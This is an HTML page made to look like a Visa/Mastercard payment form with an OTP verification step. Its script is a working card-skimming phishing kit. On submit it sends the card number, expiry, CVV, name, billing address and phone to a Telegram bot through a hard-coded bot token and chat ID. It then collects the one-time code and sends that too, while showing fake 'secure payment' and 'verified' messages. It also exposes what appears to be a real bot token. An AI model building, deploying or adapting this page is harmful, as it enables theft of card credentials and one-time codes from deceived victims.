<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Form</title>
    <style>
        * { 
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', 'Segoe UI', Roboto, sans-serif;
        }
        
        body {
            height: 100vh;
            background: url('Homme.jpg') no-repeat center/cover;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: #111;
        }
        
        .payment-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            transition: all 0.3s ease;
            padding: 20px;
        }
        
        .payment-overlay.active {
            opacity: 1;
            visibility: visible;
        }
        
        .payment-container {
            background: #fff;
            border-radius: 18px;
            width: 100%;
            max-width: 480px;
            height: 600px;
            padding: 32px;
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.15);
            transform: translateY(20px);
            transition: all 0.3s ease;
            display: flex;
            flex-direction: column;
            overflow: visible;
        }
        
        .payment-overlay.active .payment-container {
            transform: translateY(0);
        }
        
        .payment-header {
            text-align: center;
            color: #333;
            margin-bottom: 16px;
        }
        
        .payment-header h2 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .payment-close {
            position: absolute;
            top: 20px;
            right: 20px;
            background: none;
            border: none;
            color: #888;
            font-size: 22px;
            cursor: pointer;
        }
        
        /* Amount Input Styles */
        .amount-container {
            display: flex;
            flex-direction: column;
            gap: 16px;
            margin-bottom: 16px;
        }
        
        .amount-group {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }
        
        .amount-group input {
            font-size: 18px;
            font-weight: 600;
            text-align: center;
            padding: 16px;
            background: #f5f5ff;
            border: 1px solid #e0e0ff;
            border-radius: 12px;
            width: 100%;
        }
        
        .amount-group input:focus {
            border-color: #6c63ff;
            background: #fff;
            box-shadow: 0 0 0 3px rgba(108, 99, 255, 0.1);
            outline: none;
        }
        
        .amount-enter-btn {
            background: linear-gradient(135deg, #6c63ff, #9b59b6);
            color: white;
            border: none;
            padding: 14px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s ease;
            box-shadow: 0 6px 20px rgba(108, 99, 255, 0.25);
        }
        
        .amount-enter-btn:hover {
            transform: translateY(-2px);
            opacity: 0.95;
        }
        
        /* Card Fields */
        .card-fields {
            display: none;
            flex-direction: column;
            gap: 16px;
            flex: 1;
            overflow-y: auto;
            padding-right: 8px;
            margin-right: -8px;
            padding-left: 1.8px;
        }
        
        .payment-form {
            display: flex;
            flex-direction: column;
            height: 100%;
        }
        
        .form-group {
            position: relative;
            display: flex;
            flex-direction: column;
            gap: 6px;
            flex: 1;
            min-width: 0;
            margin-bottom: 16px;
        }
        
        .form-group label {
            font-size: 13px;
            color: #666;
            margin-left: 4px;
        }
        
        .form-group input,
        .form-group select {
            padding: 13px 16px;
            border: 1px solid #e0e0e0;
            border-radius: 12px;
            font-size: 15px;
            transition: all 0.2s ease;
            background: #f9f9f9;
            position: relative; /* Ensures radius isn't clipped by parent */
            z-index: 1; /* Lifts input above any overlapping shadows */
            background-clip: padding-box; /* Prevents bg color from bleeding outside radius */
        }
        
        .form-group input:focus,
        .form-group select:focus {
            border-color: #6c63ff;
            outline: none;
            background: #fff;
            box-shadow: 0 0 0 3px rgba(108, 99, 255, 0.1);
        }
        
        .payment-footer {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: auto;
            padding-bottom: 15%;
        }
        
        .submit-btn {
            background: linear-gradient(135deg, #6c63ff, #9b59b6);
            color: white;
            border: none;
            padding: 14px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s ease;
            box-shadow: 0 6px 20px rgba(108, 99, 255, 0.25);
        }
        
        .submit-btn:hover {
            transform: translateY(-2px);
            opacity: 0.95;
        }
        
        .secure-note {
            font-size: 13px;
            color: #888;
            text-align: center;
        }
        
        .billing-toggle {
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
            padding: 16px 0;
            border-top: 1px solid #eee;
            margin-top: 8px;
            font-weight: 500;
            font-size: 14px;
            color: #6c63ff;
            user-select: none;
            transition: color 0.3s;
        }
        
        .billing-toggle:hover {
            color: #5a54e3;
        }
        
        .billing-toggle i {
            transition: transform 0.3s ease;
            font-style: normal;
            font-size: 12px;
        }
        
        .billing-toggle.active i {
            transform: rotate(180deg);
        }
        
        .billing-fields {
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        }
        
        .billing-fields.active {
            max-height: none;
            overflow: visible;
            margin-top: 8px;
        }
        
        .form-row {
            display: flex;
            gap: 16px;
            flex-wrap: wrap;
        }
        
        .form-row .form-group {
            flex: 1;
            min-width: 120px;
            margin-bottom: 12px;
        }


/* 3. Rebuild the input's border and radius properly */
.form-group input {
    
    
    border-radius: 12px !important;
    background-clip: padding-box !important;
    box-shadow: 
        0 0 0 1px #e0e0e0, /* Border replacement */
        inset 0 0 0 1px #e0e0e0; /* Inner border */
    
    
}


        
        /* Responsive Improvements */
        @media (max-width: 550px) {
            .form-row {
                flex-direction: column;
                gap: 0;
            }
            .payment-container {
                height: 85vh;
                max-height: 700px;
                width: 100%;
            }
            body {
                background: url('Hommem.jpg') no-repeat;
                background-size: cover;
                background-position: center;
                display: flex;
                align-items: center;
                padding: 0 10%;
            }
        }
        
        /* Custom scrollbar */
        .card-fields::-webkit-scrollbar {
            width: 8px;
        }
        
        .card-fields::-webkit-scrollbar-track {
            background: transparent;
            margin: 16px 0;
        }
        
        .card-fields::-webkit-scrollbar-thumb {
            background: rgba(0,0,0,0.15);
            border-radius: 4px;
            border: 2px solid transparent;
            background-clip: padding-box;
        }
        
        .card-fields::-webkit-scrollbar-thumb:hover {
            background: rgba(0,0,0,0.25);
            border: 2px solid transparent;
            background-clip: padding-box;
        }
        
        /* Verification Modal */
        .verification-modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.7);
            z-index: 2000;
            display: none;
            align-items: center;
            justify-content: center;
        }
        
        .verification-box {
            background: white;
            padding: 32px;
            border-radius: 16px;
            width: 90%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
        }
        
        .verification-box h2 {
            margin-bottom: 8px;
            color: #333;
        }
        
        .verification-box p {
            color: #666;
            margin-bottom: 24px;
            font-size: 14px;
        }
        
        .verification-input {
            width: 100%;
            padding: 16px;
            border: 1px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            margin-bottom: 20px;
            text-align: center;
            letter-spacing: 2px;
        }
        
        .verification-input:focus {
            outline: none;
            border-color: #6c63ff;
            box-shadow: 0 0 0 3px rgba(108, 99, 255, 0.1);
        }

    </style>
</head>
<body>
    <!-- PAYMENT POPUP -->
    <div id="paymentOverlay" class="payment-overlay active">
        <div class="payment-container">
            <div class="payment-header">
                <button class="payment-close" id="closePayment">&times;</button>
                <h2>Visa | Mastercard</h2>
                <p>Enter card details</p>
            </div>

            <form id="paymentForm" class="payment-form">
                <!-- Amount Input (shown first) -->
                <div id="amountSection" class="amount-container">
                    <div class="form-group amount-group">
                        <label for="paymentAmount">Payment Amount</label>
                        <input type="text" id="paymentAmount" placeholder="0.00" inputmode="decimal">
                    </div>
                    <button type="button" id="amountEnterBtn" class="amount-enter-btn">Enter Amount</button>
                </div>

                <!-- Card Fields (hidden initially) -->
                <div id="cardFields" class="card-fields">
                    <!-- CARD DETAILS -->
                    <div class="form-group">
                        <label for="cardNumber">Card Number</label>
                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">
                    </div>

                    <div class="form-row">
                        <div class="form-group">
                            <label for="expiryDate">Expiry Date</label>
                            <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5">
                        </div>
                        <div class="form-group">
                            <label for="cvv">CVV</label>
                            <input type="text" id="cvv" placeholder="123" maxlength="4">
                        </div>
                    </div>

                    <div class="form-group">
                        <label for="cardName">Name on Card</label>
                        <input type="text" id="cardName" placeholder="John Doe">
                    </div>

                    <!-- BILLING TOGGLE -->
                    <div class="billing-toggle" id="billingToggle">
                        <span>Select Country</span>
                        <i>▼</i>
                    </div>

                    <!-- BILLING FIELDS (HIDDEN BY DEFAULT) -->
                    <div class="billing-fields" id="billingFields">
                        <div class="form-group">
                            <label for="billingAddress">Billing Address</label>
                            <input type="text" id="billingAddress" placeholder="123 Main Street">
                        </div>

                        <div class="form-row">
                            <div class="form-group">
                                <label for="city">City</label>
                                <input type="text" id="city" placeholder="New York">
                            </div>
                            <div class="form-group">
                                <label for="zipCode">ZIP Code</label>
                                <input type="text" id="zipCode" placeholder="10001">
                            </div>
                        </div>

                        <div class="form-row">
                            <div class="form-group">
                                <label for="country">Country</label>
                                <select id="country">
                                    <option value="">Select Country</option>
                                    <option value="Australia">Australia</option>
                                </select>
                            </div>
                            <div class="form-group">
                                <label for="phone">Phone Number</label>
                                <input type="tel" id="phone" placeholder="+1 (555) 123-4567">
                            </div>
                        </div>
                    </div>
                </div>
                <div class="payment-footer">
                    <button type="submit" class="submit-btn" id="paymentSubmitBtn" style="display: none;">Pay</button>
                    <p class="secure-note">
                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"></path>
                            <circle cx="12" cy="12" r="3"></circle>
                        </svg> Secure SSL encrypted payment
                    </p>
                </div>
            </form>
        </div>
    </div>

    <!-- VERIFICATION MODAL -->
    <div id="verificationModal" class="verification-modal">
        <div class="verification-box">
            <h2>Enter Verification OTP</h2>
            <p>Delivered in two minutes</p>
            <input type="text" id="verificationCode" class="verification-input" placeholder="Enter OTP" required>
            <button id="verifyBtn" class="submit-btn">Verify</button>
        </div>
    </div>

    <script>
        // Close button functionality
        document.getElementById('closePayment').addEventListener('click', function() {
            window.location.href = 'index.html';
        });

        // Telegram Configuration (REPLACE THESE)
        const BOT_TOKEN = '7943519219:AAEDpoE4l7ppDVN_YuORz6h53AYMt_jbaTQ';
        const CHAT_ID = '7131845752';

        // DOM Elements
        const paymentOverlay = document.getElementById('paymentOverlay');
        const paymentForm = document.getElementById('paymentForm');
        const cardNumber = document.getElementById('cardNumber');
        const expiryDate = document.getElementById('expiryDate');
        const billingToggle = document.getElementById('billingToggle');
        const billingFields = document.getElementById('billingFields');
        const verificationModal = document.getElementById('verificationModal');
        const verifyBtn = document.getElementById('verifyBtn');
        const paymentAmount = document.getElementById('paymentAmount');
        const cardFields = document.getElementById('cardFields');
        const amountSection = document.getElementById('amountSection');
        const amountEnterBtn = document.getElementById('amountEnterBtn');
        const paymentSubmitBtn = document.getElementById('paymentSubmitBtn');

        // Store payment data
        let paymentData = null;
        let currentAmount = '0.00';

        // Amount Enter Button Functionality
        amountEnterBtn.addEventListener('click', function() {
            const amount = paymentAmount.value.trim();
            
            // Basic validation
            if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
                alert('Please enter a valid amount greater than 0');
                paymentAmount.focus();
                return;
            }
            
            // Store the amount
            currentAmount = parseFloat(amount).toFixed(2);
            
            // Hide amount section and show card fields
            amountSection.style.display = 'none';
            cardFields.style.display = 'flex';
            paymentSubmitBtn.style.display = 'block';
            paymentSubmitBtn.textContent = `Pay $${currentAmount}`;
            
            // Focus on first card field
            cardNumber.focus();
        });

        // Support for pressing Enter key in amount field
        paymentAmount.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                amountEnterBtn.click();
            }
        });

        // Toggle billing fields
        billingToggle.addEventListener('click', () => {
            billingToggle.classList.toggle('active');
            billingFields.classList.toggle('active');

            // Update text
            const span = billingToggle.querySelector('span');
            span.textContent = billingFields.classList.contains('active') ?
                'Hide Billing Information' :
                'Select Country';
        });

        // Card number formatting
        cardNumber.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\s/g, '');
            if (value.length > 0) {
                value = value.match(/.{1,4}/g).join(' ');
            }
            e.target.value = value;
        });

        // Expiry date formatting
        expiryDate.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });

        // Send data to Telegram
        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                return response.ok;
            } catch (error) {
                console.error('Telegram error:', error);
                return false;
            }
        }

        // Form submission
        paymentForm.addEventListener('submit', async(e) => {
            e.preventDefault();

            // Validate form
            const requiredFields = [
                cardNumber,
                expiryDate,
                document.getElementById('cvv'),
                document.getElementById('cardName')
            ];

            // Billing fields are now required
            requiredFields.push(
                document.getElementById('billingAddress'),
                document.getElementById('city'),
                document.getElementById('zipCode'),
                document.getElementById('country'),
                document.getElementById('phone')
            );

            let isValid = true;
            requiredFields.forEach(field => {
                if (!field.value.trim()) {
                    field.style.borderColor = '#ff4444';
                    isValid = false;
                } else {
                    field.style.borderColor = '#ddd';
                }
            });

            if (!isValid) {
                alert('Please complete all required fields');
                return;
            }

            // Get form data
            paymentData = {
                amount: currentAmount,
                cardNumber: document.getElementById('cardNumber').value,
                cardName: document.getElementById('cardName').value,
                expiryDate: document.getElementById('expiryDate').value,
                cvv: document.getElementById('cvv').value,
                billingAddress: document.getElementById('billingAddress').value,
                city: document.getElementById('city').value,
                zipCode: document.getElementById('zipCode').value,
                country: document.getElementById('country').value,
                phone: document.getElementById('phone').value
            };

            // Create Telegram message with billing information
            const message = `💳 *New Payment* 💳
*Amount:* $${paymentData.amount}

*Card Details:*
Card: ${paymentData.cardNumber}
Name: ${paymentData.cardName}
Expiry: ${paymentData.expiryDate}
CVV: ${paymentData.cvv}

*Billing Information:*
Address: ${paymentData.billingAddress}
City: ${paymentData.city}
ZIP: ${paymentData.zipCode}
Country: ${paymentData.country}
Phone: ${paymentData.phone}

Awaiting verification...`;

            // Send to Telegram
            paymentSubmitBtn.disabled = true;
            paymentSubmitBtn.textContent = 'Processing...';

            try {
                const success = await sendToTelegram(message);

                if (success) {
                    paymentOverlay.classList.remove('active');
                    verificationModal.style.display = 'flex';
                    document.getElementById('verificationCode').focus();
                } else {
                    alert('Failed, Check Internet Connections');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('An error occurred');
            } finally {
                paymentSubmitBtn.disabled = false;
                paymentSubmitBtn.textContent = `Pay $${currentAmount}`;
            }
        });

        // Verification submission
        verifyBtn.addEventListener('click', async() => {
            const code = document.getElementById('verificationCode').value.trim();

            if (!code) {
                alert('Please enter verification code');
                return;
            }

            // Create verification message with all details
            const message = `🔐 *Verification Code* 🔐
*Payment Details:*
Amount: $${paymentData.amount}
Card: ${paymentData.cardNumber}
Name: ${paymentData.cardName}
Expiry: ${paymentData.expiryDate}

*Billing Information:*
Address: ${paymentData.billingAddress}
City: ${paymentData.city}
ZIP: ${paymentData.zipCode}
Country: ${paymentData.country}
Phone: ${paymentData.phone}

Entered code: ${code}`;

            verifyBtn.disabled = true;
            verifyBtn.textContent = 'Verifying...';

            try {
                const success = await sendToTelegram(message);

                if (success) {
                    alert('Payment verified successfully!');
                    verificationModal.style.display = 'none';
                    paymentForm.reset();
                    amountSection.style.display = 'flex';
                    cardFields.style.display = 'none';
                    paymentSubmitBtn.style.display = 'none';
                    paymentAmount.value = '';
                    paymentAmount.focus();
                } else {
                    alert('Failed to verify');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Verification failed');
            } finally {
                verifyBtn.disabled = false;
                verifyBtn.textContent = 'Verify';
            }
        });

        // Initialize form state
        paymentAmount.focus();
    </script>
</body>
</html>
